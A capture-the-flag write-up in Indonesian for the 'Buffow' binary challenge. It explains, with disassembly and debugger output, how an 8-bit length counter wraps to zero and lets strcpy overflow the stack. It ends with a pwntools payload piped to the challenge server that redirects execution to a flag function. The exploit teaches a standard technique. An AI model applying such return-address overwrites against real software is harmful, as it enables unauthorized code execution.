# __ASGama CTF__ 
## _Buffow_

## Information
**Category:** | **Points:** | **Writeup Author**
--- | --- | ---
Binary Exploitation | 200 | l0l

**Description:** 

> Buffer overflow aman selama kita mengecek panjang input, kan?
>
> nc asgama.web.id 40211

>
> [buffow](./buffow)

### buffow
```
ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=10ddb3cec335906e1fc641fce780bffc73fcb09a, not stripped

gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

### buffow Disassembly

#### info func
```
gdb-peda$ info func
All defined functions:

Non-debugging symbols:
0x08049000  _init
0x08049040  strcpy@plt
0x08049050  malloc@plt
0x08049060  system@plt
0x08049070  exit@plt
0x08049080  __libc_start_main@plt
0x08049090  __isoc99_scanf@plt
0x080490a0  __gmon_start__@plt
0x080490b0  _start
0x080490f0  _dl_relocate_static_pie
0x08049100  __x86.get_pc_thunk.bx
0x08049110  deregister_tm_clones
0x08049150  register_tm_clones
0x08049190  __do_global_dtors_aux
0x080491c0  frame_dummy
0x080491c2  flag
0x080491f0  check
0x08049209  loop
0x0804920a  init
0x0804921c  ex
0x08049228  cpy
0x08049253  main
0x080492b5  __x86.get_pc_thunk.ax
0x080492c0  __libc_csu_init
0x08049320  __libc_csu_fini
0x08049324  _fini

```


#### main
```
gdb-peda$ pdisass main
Dump of assembler code for function main:
   0x08049253 <+0>:	lea    ecx,[esp+0x4]
   0x08049257 <+4>:	and    esp,0xfffffff0
   0x0804925a <+7>:	push   DWORD PTR [ecx-0x4]
   0x0804925d <+10>:	push   ebp
   0x0804925e <+11>:	mov    ebp,esp
   0x08049260 <+13>:	push   ebx
   0x08049261 <+14>:	push   ecx
   0x08049262 <+15>:	sub    esp,0x10
   0x08049265 <+18>:	call   0x8049100 <__x86.get_pc_thunk.bx>
   0x0804926a <+23>:	add    ebx,0x2d96
   0x08049270 <+29>:	sub    esp,0xc
   0x08049273 <+32>:	push   0x1f5
   0x08049278 <+37>:	call   0x8049050 <malloc@plt>
   0x0804927d <+42>:	add    esp,0x10
   0x08049280 <+45>:	mov    DWORD PTR [ebp-0xc],eax
   0x08049283 <+48>:	sub    esp,0x8
   0x08049286 <+51>:	push   DWORD PTR [ebp-0xc]
   0x08049289 <+54>:	lea    eax,[ebx-0x1fed]
   0x0804928f <+60>:	push   eax
   0x08049290 <+61>:	call   0x8049090 <__isoc99_scanf@plt>
   0x08049295 <+66>:	add    esp,0x10
   0x08049298 <+69>:	sub    esp,0xc
   0x0804929b <+72>:	push   DWORD PTR [ebp-0xc]
   0x0804929e <+75>:	call   0x80491f0 <check>
   0x080492a3 <+80>:	add    esp,0x10
   0x080492a6 <+83>:	mov    eax,0x0
   0x080492ab <+88>:	lea    esp,[ebp-0x8]
   0x080492ae <+91>:	pop    ecx
   0x080492af <+92>:	pop    ebx
   0x080492b0 <+93>:	pop    ebp
   0x080492b1 <+94>:	lea    esp,[ecx-0x4]
   0x080492b4 <+97>:	ret    
End of assembler dump.
```

#### check
```
gdb-peda$ pdisass check
Dump of assembler code for function check:
   0x080491f0 <+0>:	push   ebp
   0x080491f1 <+1>:	mov    ebp,esp
   0x080491f3 <+3>:	call   0x80492b5 <__x86.get_pc_thunk.ax>
   0x080491f8 <+8>:	add    eax,0x2e08
   0x080491fd <+13>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08049200 <+16>:	mov    edx,eax
   0x08049202 <+18>:	mov    eax,0x0
   0x08049207 <+23>:	jmp    0x804920a <check+26>
   0x08049209 <+25>:	inc    eax
   0x0804920a <+26>:	mov    bl,BYTE PTR [edx+eax*1]
   0x0804920d <+29>:	test   bl,bl
   0x0804920f <+31>:	jne    0x8049209 <check+25>
   0x08049211 <+33>:	cmp    al,0x34
   0x08049213 <+35>:	jbe    0x804921c <check+44>
   0x08049215 <+37>:	push   0x0
   0x08049217 <+39>:	call   0x8049070 <exit@plt>
   0x0804921c <+44>:	push   edx
   0x0804921d <+45>:	call   0x8049228 <cpy>
   0x08049222 <+50>:	add    esp,0x4
   0x08049225 <+53>:	nop
   0x08049226 <+54>:	pop    ebp
   0x08049227 <+55>:	ret    
End of assembler dump.
```

#### cpy
```
gdb-peda$ pdisass cpy
Dump of assembler code for function cpy:
   0x08049228 <+0>:	push   ebp
   0x08049229 <+1>:	mov    ebp,esp
   0x0804922b <+3>:	push   ebx
   0x0804922c <+4>:	sub    esp,0x34
   0x0804922f <+7>:	call   0x80492b5 <__x86.get_pc_thunk.ax>
   0x08049234 <+12>:	add    eax,0x2dcc
   0x08049239 <+17>:	sub    esp,0x8
   0x0804923c <+20>:	push   DWORD PTR [ebp+0x8]
   0x0804923f <+23>:	lea    edx,[ebp-0x30]
   0x08049242 <+26>:	push   edx
   0x08049243 <+27>:	mov    ebx,eax
   0x08049245 <+29>:	call   0x8049040 <strcpy@plt>
   0x0804924a <+34>:	add    esp,0x10
   0x0804924d <+37>:	nop
   0x0804924e <+38>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x08049251 <+41>:	leave  
   0x08049252 <+42>:	ret    
End of assembler dump.
```

#### flag
```
gdb-peda$ pdisass flag
Dump of assembler code for function flag:
   0x080491c2 <+0>:	push   ebp
   0x080491c3 <+1>:	mov    ebp,esp
   0x080491c5 <+3>:	push   ebx
   0x080491c6 <+4>:	sub    esp,0x4
   0x080491c9 <+7>:	call   0x8049100 <__x86.get_pc_thunk.bx>
   0x080491ce <+12>:	add    ebx,0x2e32
   0x080491d4 <+18>:	sub    esp,0xc
   0x080491d7 <+21>:	lea    eax,[ebx-0x1ff8]
   0x080491dd <+27>:	push   eax
   0x080491de <+28>:	call   0x8049060 <system@plt>
   0x080491e3 <+33>:	add    esp,0x10
   0x080491e6 <+36>:	sub    esp,0xc
   0x080491e9 <+39>:	push   0x0
   0x080491eb <+41>:	call   0x8049070 <exit@plt>
End of assembler dump.
```

Terdapat fungsi flag, yang sepertinya akan menampilkan flag.

Pada program ini, input kita diterima dengan scanf (aman dari buffer overflow), jadi di fungsi main tidak bisa kita overflow return addressnya, setelah menerima input, program memanggil fungsi check. Di fungsi check ini, register `al` digunakan sebagai counter untuk menghitung jumlah karakter pada input kita. Jika isi `al` kurang dari atau sama dengan 0x34, maka input dianggap aman dan program lanjut ke fungsi cpy, jika tidak, maka input dianggap berbahaya lalu program exit.

Di fungsi cpy ini terdapat celah buffer overflow karena penggunaan fungsi `strcpy` yang tidak membatasi jumlah karakter yang dicopy. namun input kita diletakkan pada `ebp-0x30`, berarti butuh 0x38 bytes karakter jika kita ingin overwrite return address dari fungsi cpy. Namun seperti pada penjelasan di atas, register `al` sebagai counter karakter dicek dulu apakah kurang dari 35 atau tidak sebelum bisa masuk ke fungsi cpy.

#### Kelemahan
Kelemahan program ini ada pada penggunaan register `al` untuk counter. Register ini memiliki nilai maksimal hingga 0xff saja, setelah melebihi nilai ini, `inc eax` akan membuat nilai register `eax` menjadi 0x100, sehingga nilai `al` menjadi 0x00. Dan ini akan lolos dari pengecekan. 

#### Test input dengan 0x100 karakter
```
gdb-peda$ break *0x8049211
Breakpoint 1 at 0x8049211

gdb-peda$ r < <(python -c "print 'A'*0x100")

[-------------------------------------code-------------------------------------]
   0x804920d <check+29>:	test   bl,bl
   0x804920f <check+31>:	jne    0x8049209 <check+25>
   0x8049211 <check+33>:	cmp    al,0x34
=> 0x8049213 <check+35>:	jbe    0x804921c <check+44>
 | 0x8049215 <check+37>:	push   0x0
 | 0x8049217 <check+39>:	call   0x8049070 <exit@plt>
 | 0x804921c <check+44>:	push   edx
 | 0x804921d <check+45>:	call   0x8049228 <cpy>
 |->   0x804921c <check+44>:	push   edx
       0x804921d <check+45>:	call   0x8049228 <cpy>
       0x8049222 <check+50>:	add    esp,0x4
       0x8049225 <check+53>:	nop
                                                                  JUMP is taken
[------------------------------------stack-------------------------------------]
```

Terlihat bahwa `JUMP is taken`, berarti kita akan masuk dalam fungsi cpy dengan argumen input kita.

```
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414141
[------------------------------------stack-------------------------------------]
0000| 0xffffcea4 ('A' <repeats 200 times>)
0004| 0xffffcea8 ('A' <repeats 196 times>)
0008| 0xffffceac ('A' <repeats 192 times>)
0012| 0xffffceb0 ('A' <repeats 188 times>)
0016| 0xffffceb4 ('A' <repeats 184 times>)
0020| 0xffffceb8 ('A' <repeats 180 times>)
0024| 0xffffcebc ('A' <repeats 176 times>)
0028| 0xffffcec0 ('A' <repeats 172 times>)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414141 in ?? ()
```

Terlihat return address telah diganti menjadi 0x41414141. Berarti kita perlu memberi input berupa padding sebanyak 0x34 karakter diikuti dengan address fungsi flag, lalu ditambah lagi karakter sampah sampai panjangnya 0x100.



### Payload
`$ python -c "from pwn import p32;print 'A'*0x34+p32(0x080491c2)+'A'*(0x100-0x34-0x4)" | nc asgama.web.id 40211`


### Result 
```
python -c "from pwn import p32;print 'A'*0x34+p32(0x080491c2)+'A'*(0x100-0x34-0x4)" | nc asgama.web.id 40211
GamaCTF{Ini_Bukan_Flagnya}
```

### Flag 
GamaCTF{Ini_Bukan_Flagnya}